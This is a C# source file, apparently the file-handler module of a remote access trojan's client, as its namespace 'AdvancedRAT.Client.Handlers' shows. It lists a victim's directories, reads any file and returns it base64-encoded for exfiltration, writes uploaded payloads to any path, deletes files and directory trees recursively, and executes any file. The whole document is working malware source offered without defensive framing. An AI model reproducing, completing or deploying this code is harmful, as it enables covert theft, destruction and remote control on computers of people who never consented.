using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace AdvancedRAT.Client.Handlers
{
    public class FileHandler
    {
        public async Task<object> ListFiles(string path)
        {
            try
            {
                var files = new List<object>();
                
                if (Directory.Exists(path))
                {
                    foreach (var dir in Directory.GetDirectories(path))
                    {
                        var dirInfo = new DirectoryInfo(dir);
                        files.Add(new
                        {
                            name = dirInfo.Name,
                            type = "directory",
                            size = 0,
                            modified = dirInfo.LastWriteTime.ToString()
                        });
                    }
                    
                    foreach (var file in Directory.GetFiles(path))
                    {
                        var fileInfo = new FileInfo(file);
                        files.Add(new
                        {
                            name = fileInfo.Name,
                            type = "file",
                            size = fileInfo.Length,
                            modified = fileInfo.LastWriteTime.ToString()
                        });
                    }
                }
                
                return new { success = true, files };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> DownloadFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    byte[] fileBytes = await File.ReadAllBytesAsync(path);
                    string base64 = Convert.ToBase64String(fileBytes);
                    
                    return new
                    {
                        success = true,
                        filename = Path.GetFileName(path),
                        data = base64,
                        size = fileBytes.Length
                    };
                }
                
                return new { success = false, message = "File not found" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> UploadFile(string path, dynamic data)
        {
            try
            {
                byte[] fileBytes = Convert.FromBase64String(data.ToString());
                await File.WriteAllBytesAsync(path, fileBytes);
                
                return new { success = true, message = $"File uploaded: {path}" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> DeleteFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                    return new { success = true, message = "File deleted" };
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                    return new { success = true, message = "Directory deleted" };
                }
                
                return new { success = false, message = "Path not found" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ExecuteFile(string path)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = path,
                    UseShellExecute = true
                });
                
                return new { success = true, message = "File executed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
